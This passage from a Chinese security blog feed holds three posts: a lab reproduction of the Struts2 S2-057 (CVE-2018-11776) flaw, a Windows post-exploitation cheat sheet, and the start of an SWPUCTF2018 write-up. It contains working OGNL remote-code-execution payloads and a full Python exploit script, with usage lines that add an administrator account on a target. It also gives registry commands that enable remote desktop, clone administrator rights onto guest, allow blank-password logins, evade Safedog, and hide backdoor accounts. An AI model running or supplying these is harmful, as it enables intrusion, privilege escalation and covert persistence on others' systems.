rel="external">https://tomcat.apache.org/download-70.cgi</a><br><img src="http://img.cdn.cuittk.cn/u3c354uz0k9it2gfu2pam7vi.png" alt="">我下载的windows 64的压缩包。将tomcat解压<br><img src="http://img.cdn.cuittk.cn/difdllbh4n2ym65tn596m8h19v.png" alt=""><br>下载Struts-2.3.34，下载地址：<a href="http://archive.apache.org/dist/struts/2.3.34/" target="_blank" rel="external">http://archive.apache.org/dist/struts/2.3.34/</a><br>选择第一个struts-2.3.34-all.zip<br><img src="http://img.cdn.cuittk.cn/2ughdohp6szwif83irwox34wbf.png" alt=""><br>将压缩包里的struts2-showcase.war放至在tomcat下的webapps目录下进行自动部署<br><img src="http://img.cdn.cuittk.cn/4w45i31lg76cg0v5n3oqixb1hh.png" alt=""><br>在tomcat下bin目录下运行startup.bat脚本就可以自动运行tomcat来部署struts2了。<br>成功部署完成后我们在浏览器中输入<a href="http://127.0.0.1:8080/struts2-showcase" target="_blank" rel="external">http://127.0.0.1:8080/struts2-showcase</a> 就可以部署成功了。<br><img src="http://img.cdn.cuittk.cn/cf5vxetpaxfj3xft0f0u31z4r6.png" alt=""><br>正常部署完成struts如上所示，但为了复现struts2-057漏洞。我们的满足跳转的条件。故此我们的进行修改默认的action控制器来设置跳转的逻辑。方便我们复现漏洞。<br>需要修改的地方有两处，两个文件都修改：<br>1、D:\tomcat\webapps\struts2-showcase\WEB-INF\src\java\struts-actionchaining.xml<br>2、D:\tomcat\webapps\struts2-showcase\WEB-INF\classes\struts-actionchaining.xml<br>我们注释掉原来的xml文件。修改为如下所示：<br><img src="http://img.cdn.cuittk.cn/8901sfw3g8yf1y3hniyknfqpbk.png" alt=""><br>修改后代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;struts&gt;</div><div class="line">&lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;</div><div class="line">&lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;</div><div class="line">&lt;result type=&quot;redirectAction&quot;&gt;</div><div class="line">&lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;</div><div class="line">&lt;/result&gt;</div><div class="line">&lt;/action&gt;</div><div class="line">&lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt;</div><div class="line">&lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt;</div><div class="line">&lt;/action&gt;</div><div class="line">&lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt;</div><div class="line">&lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt;</div><div class="line">&lt;/action&gt;</div><div class="line">&lt;/package&gt;</div><div class="line">&lt;/struts&gt;</div></pre></td></tr></table></figure></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>构造payload：<br><code>http://127.0.0.1:8080/struts2-showcase/${(222+333)}/actionChain1.action</code><br>执行完成之后发现跳转到了<code>http://127.0.0.1:8080/struts2-showcase/555/register2.action</code><br>说明存在OGNL注入。证明漏洞存在。<br>随后在进行调用本地计算器命令来测试。<br>Payload如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&apos;struts.valueStack&apos;].context).(#cr=#ct[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))&#125;</div></pre></td></tr></table></figure></p><p>执行之前我们先进行URL编码得到如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d</div></pre></td></tr></table></figure></p><p>拼接如下的url进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action</div></pre></td></tr></table></figure></p><p>成功调用本地计算器。<br><img src="http://img.cdn.cuittk.cn/saxjp3r8qvzhblzjrpu8snx9zr.png" alt=""><br>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">#coding: utf-8</div><div class="line">import requests</div><div class="line">import sys</div><div class="line"></div><div class="line">def expliot(host, command, path):</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    2.3.34版本</div><div class="line">    payload1:</div><div class="line">    $&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&apos;struts.valueStack&apos;].context).(#cr=#ct[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ipconfig&apos;).getInputStream()))).(#w.close())&#125;</div><div class="line"></div><div class="line">    2.3.20版本</div><div class="line">    payload2:</div><div class="line">    $&#123;(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ipconfig&apos;).getInputStream()))).(#w.close())&#125;</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    </div><div class="line">    str1 = &quot;$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&apos;struts.valueStack&apos;].context).(#cr=#ct[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;&quot;+command+&quot;&apos;).getInputStream()))).(#w.close())&#125;&quot;</div><div class="line">    str1 = str1.encode(&apos;hex&apos;)</div><div class="line">    str2 = &quot;$&#123;(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;&quot;+command+&quot;&apos;).getInputStream()))).(#w.close())&#125;&quot;</div><div class="line">    str2 = str2.encode(&apos;hex&apos;)</div><div class="line"></div><div class="line">    #需要进行URL编码</div><div class="line">    payload1 = &quot;&quot;</div><div class="line">    for i in range(0,len(str1),2):</div><div class="line">        payload1 += &apos;%&apos;+str1[i:i+2]</div><div class="line"></div><div class="line">    payload2 = &quot;&quot;</div><div class="line">    for i in range(0,len(str2),2):</div><div class="line">        payload2 += &apos;%&apos;+str2[i:i+2]</div><div class="line"></div><div class="line">    url1 = host+&apos;/&apos;+payload1+&apos;/&apos;+path</div><div class="line">    url2 = host+&apos;/&apos;+payload2+&apos;/&apos;+path</div><div class="line">    </div><div class="line">    res1 = requests.get(url1, allow_redirects=False)</div><div class="line">    res2 = requests.get(url2, allow_redirects=False)</div><div class="line">    if res1.status_code == 200 and res2.status_code != 200:</div><div class="line">        print &quot;Exploit successful:&quot;</div><div class="line">print res1.content</div><div class="line">    elif res2.status_code == 200 and res1.status_code != 200:</div><div class="line">print &quot;Exploit successful:&quot;</div><div class="line">print res2.content</div><div class="line">    else:</div><div class="line">print(&apos;The target is likely unvulnerable,mabye your struts2 version is too high!&apos;)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    if len(sys.argv) &lt; 4:</div><div class="line">        print(&quot;Usage: python s2-057-exp.py http://www.xxx.com/ &#123;command&#125; &#123;The path such as:actionChain1.action&#125;&quot;)</div><div class="line">    else:</div><div class="line">        expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())</div></pre></td></tr></table></figure></p><p><code>python s2_057_exp.py http://192.168.123.207:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action</code><br><code>python s2_057_exp.py http://192.168.123.207:8080/struts2-showcase/ &quot;net user guast Admin123a /add&quot; actionChain1.action</code><br><code>python s2_057_exp.py http://192.168.123.207:8080/struts2-showcase/ &quot;net localgroup administrators guast /add&quot; actionChain1.action</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Struts2-057-CVE-2018-11776-漏洞从搭建到复现&quot;&gt;&lt;a href=&quot;#Struts2-057-CVE-2018-11776-漏洞从搭建到复现&quot; class=&quot;headerlink&quot; title=&quot;Struts2-057(CVE-2018-1
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows后渗透实用小结</title>
    <link href="http://www.cuittk.cn/2018/12/25/windows%E5%90%8E%E6%B8%97%E9%80%8F%E5%AE%9E%E7%94%A8%E5%B0%8F%E7%BB%93/"/>
    <id>http://www.cuittk.cn/2018/12/25/windows后渗透实用小结/</id>
    <published>2018-12-25T12:57:25.320Z</published>
    <updated>2019-07-14T09:59:23.883Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windows后渗透实用小结"><a href="#windows后渗透实用小结" class="headerlink" title="windows后渗透实用小结"></a>windows后渗透实用小结</h2><h3 id="webshell后开启服务器3389端口"><a href="#webshell后开启服务器3389端口" class="headerlink" title="webshell后开启服务器3389端口"></a>webshell后开启服务器3389端口</h3><h4 id="开启3389命令"><a href="#开启3389命令" class="headerlink" title="开启3389命令"></a>开启3389命令</h4><p>只适用于：Win7、Win2003、XP系统，windows2012不行<br>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</div></pre></td></tr></table></figure></p><p>windows server 2000<br>新建文件 3389.reg 内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line">[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server]</div><div class="line">&quot;fDenyTSConnections&quot;=dword:00000000</div><div class="line">[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWdsrdpwdTdstcp]</div><div class="line">&quot;PortNumber&quot;=dword:00000D3D</div><div class="line">[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp]</div><div class="line">&quot;PortNumber&quot;=dword:00000D3D</div></pre></td></tr></table></figure></p><p>regedit /s C:/www/3389.reg </p><h4 id="查询远程桌面服务开启状态"><a href="#查询远程桌面服务开启状态" class="headerlink" title="查询远程桌面服务开启状态"></a>查询远程桌面服务开启状态</h4><p>查询系统是否开启远程桌面服务，命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</div></pre></td></tr></table></figure></p><p>执行结果如图1所示：<br><img src="http://img.cdn.cuittk.cn/remote-desktop-status.png" alt=""><br>如果fDenyTSConnections的值为0x1则表示关闭；0x0表示开启。</p><h4 id="查询远程桌面服务端口号"><a href="#查询远程桌面服务端口号" class="headerlink" title="查询远程桌面服务端口号"></a>查询远程桌面服务端口号</h4><p>查询远程桌面服务端口号，命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</div></pre></td></tr></table></figure></p><p>查询结果如图2所示：<br><img src="http://img.cdn.cuittk.cn/remote-desktop-status1.png" alt=""><br>端口格式为16进制，0xd3d转换为十进制是3389。</p><h4 id="开启远程桌面服务"><a href="#开启远程桌面服务" class="headerlink" title="开启远程桌面服务"></a>开启远程桌面服务</h4><p>如果远程桌面服务关闭的话，则需要开启，命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</div><div class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</div></pre></td></tr></table></figure></p><h3 id="查看进程列表"><a href="#查看进程列表" class="headerlink" title="查看进程列表"></a>查看进程列表</h3><p>tasklist<br><code>tasklist /svc</code>查看当前进程及PID号<br>Termsevice为远程桌面管理<br>找到TermSevice的PID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tasklist /svc | findstr &quot;TermService&quot;</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/qts9l6eeme31hwi7rl6ht5rlo9.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ano | find &quot;PID&quot;</div></pre></td></tr></table></figure></p><p>即可查找到真正远程服务的端口信息</p><h3 id="dos命令大全"><a href="#dos命令大全" class="headerlink" title="dos命令大全"></a>dos命令大全</h3><p>查看版本：ver<br>查看权限：whoami<br>查看配置：systeminfo<br>查看用户：net user<br>查看正在运行的服务：tasklist /svc<br>查看开放的所有端口：netstat -ano<br>查询登录用户名：query user<br>查询端口开放情况：netstat -ano | findstr “LISTENING”</p><h3 id="提权绕过安全狗加账号的方法"><a href="#提权绕过安全狗加账号的方法" class="headerlink" title="提权绕过安全狗加账号的方法"></a>提权绕过安全狗加账号的方法</h3><p>前面有几个打狗棍法没写，因为没用，开着安全狗，上传的exe无法执行而且一会儿就被删了。<br>下面说几个可行的办法：</p><h4 id="打狗棍法一"><a href="#打狗棍法一" class="headerlink" title="打狗棍法一"></a>打狗棍法一</h4><p>首先，用guest，演示一下，具体操作是通过注册表，篡改sam下用户的F值，使其达到管理权限.<br>首先要是system权限，administrator对应值是1F4,GUEST是1F5<br>下面是步骤:<br>1.使用net user guest 1 ,将guest密码重置为1或者其他的密码，无需过问是guest否禁用<br>2.执行：reg export “HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4” “C:\Recovery\7a284e0d-0bf0-11e2-892c-dd57e9ebb1a5\1.reg”<br>导出administrator的注册表到某路径下，修改内容，将”V”值删除，只留F值,将1F4修改为1F5,保存。<br>3.修改后执行<code>regedit /s C:\Recovery\7a284e0d-0bf0-11e2-892c-dd57e9ebb1a5\1.reg</code> 导入注册表<br>就可以使用，guest 密码 1登陆了。<br>安全狗说：在账户保护全开的情况下，如果不能更改密码呢？！</p><h4 id="打狗棍法二"><a href="#打狗棍法二" class="headerlink" title="打狗棍法二"></a>打狗棍法二</h4><p>如果真的不能更改密码呢？则使用vbs查看iis用户密码，再使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg export &quot;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\names\用户名&quot; &quot;C:\Recovery\7a284e0d-0bf0-11e2-892c-dd57e9ebb1a5\2.reg&quot;</div></pre></td></tr></table></figure></p><p>查看其对应值，再重复以上第二步和第三步，使用查看到的明文密码登陆<br>安全狗又说：<br>如果不允许修改密码，iis用户是禁止登陆远程桌面的呢？</p><h4 id="打狗棍法三"><a href="#打狗棍法三" class="headerlink" title="打狗棍法三"></a>打狗棍法三</h4><p>对啊，我们该怎么办？继续听我说，大家都知道guest是空密码，那我们就使用空密码登陆。<br>执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v limitblankpassworduse /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure></p><p>修改limitblankpassworduse值为1，重复上面第二第三步骤，继续登陆。</p><h4 id="打狗棍法四"><a href="#打狗棍法四" class="headerlink" title="打狗棍法四"></a>打狗棍法四</h4><p>万不得以的时候用，建议不用<br>查询在线用户query user<br>直接修改管理员密码~</p><h3 id="隐藏、克隆账号"><a href="#隐藏、克隆账号" class="headerlink" title="隐藏、克隆账号"></a>隐藏、克隆账号</h3><p>window 隐藏系统用户制作：<br>1、CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930163439919-1227761363.png" alt=""><br>PS:CMD命令行使用”net user”,看不到”test$”这个账号，但在控制面板和本地用户和组是可以显示此用户的。<br>2、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930164238012-1661863216.png" alt=""><br>3、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930165109731-2092160311.png" alt=""><br>4、扎到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930165208794-1864170243.png" alt=""><br>5、分别将test$和“000003EC导出到桌面，删除test$用户   net user test$ /del<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930170344262-1095547163.png" alt=""><br>6、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。<br>PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$r这个账户的，只有在注册表中才能看得到。<br>检测和清理方法：<br>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。<br><img src="https://images2017.cnblogs.com/blog/894761/201710/894761-20171003185352708-1067710460.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://www.96sec.org/blog/post/77.html" target="_blank" rel="external">http://www.96sec.org/blog/post/77.html</a><br><a href="https://www.cnblogs.com/xiaozi/p/7613288.html" target="_blank" rel="external">https://www.cnblogs.com/xiaozi/p/7613288.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;windows后渗透实用小结&quot;&gt;&lt;a href=&quot;#windows后渗透实用小结&quot; class=&quot;headerlink&quot; title=&quot;windows后渗透实用小结&quot;&gt;&lt;/a&gt;windows后渗透实用小结&lt;/h2&gt;&lt;h3 id=&quot;webshell后开启服务器338
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SWPUCTF2018 writeup</title>
    <link href="http://www.cuittk.cn/2018/12/18/SWPUCTF2018%20writeup/"/>
    <id>http://www.cuittk.cn/2018/12/18/SWPUCTF2018 writeup/</id>
    <published>2018-12-18T15:01:49.098Z</published>
    <updated>2018-12-25T12:56:36.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码  买个 X ?"></a>用优惠码  买个 X ?</h2><p>flag在/flag中<br>URL <a href="http://123.207.84.13:22333" target="_blank" rel="external">http://123.207.84.13:22333</a><br><img src="http://img.cdn.cuittk.cn/1r135d6ja1ii1y0aoonfgs49gg.png" alt=""><br>注册个账号登录<br>登录提示送你优惠码<br><img src="http://img.cdn.cuittk.cn/fxyoe86lrtyjs84j2wqbwwe4uz.png" alt=""><br>优惠码保存在cookie中的Auth中<br>输入优惠码提示要输入24位的优惠码<br><img src="http://img.cdn.cuittk.cn/mxudziuc7y4on6h9ghfod6y7uj.png" alt=""><br><a href="http://123.207.84.13:22333/www.zip" target="_blank" rel="external">http://123.207.84.13:22333/www.zip</a> 源码泄露<br>只有个source.php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//生成优惠码</div><div class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</div><div class="line">function youhuima()&#123;</div><div class="line">mt_srand($_SESSION[&apos;seed&apos;]);</div><div class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</div><div class="line">    $auth=&apos;&apos;;</div><div class="line">    $len=15;</div><div class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</div><div class="line">        if($i&lt;=($len/2))</div><div class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</div><div class="line">        else</div><div class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</div><div class="line">    &#125;</div><div class="line">    setcookie(&apos;Auth&apos;, $auth);</div><div class="line">&#125;</div><div class="line">//support</div><div class="line">if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</div><div class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</div><div class="line">               //执行命令</div><div class="line">        &#125;else &#123;</div><div class="line">              //flag字段和某些字符被过滤!</div><div class="line">        &#125;</div><div class="line">&#125;else&#123;</div><div class="line">             // 你的输入不正确!</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>代码中只生成了15位。验证应该还有一个生成24位。<br>无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的，随机数种子是关键。但是种子范围在rand(0,999999999);<br>只能爆破了，<br>kali下php版本为7.2.4，题目的版本是PHP/7.2.9-1，我发现本地用php5.4使用一样的种子生成的是不一样的序列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;max_execution_time&apos;,&apos;0&apos;);</div><div class="line">function youhuima()&#123;</div><div class="line">mt_srand($_SESSION[&apos;seed&apos;]);</div><div class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;//62</div><div class="line">    $auth=&apos;&apos;;</div><div class="line">    $len=15;</div><div class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</div><div class="line">        if($i&lt;=($len/2))</div><div class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</div><div class="line">        else</div><div class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*(-1), 1);</div><div class="line">    &#125;</div><div class="line">    return $auth;</div><div class="line">    //setcookie(&apos;Auth&apos;, $auth);</div><div 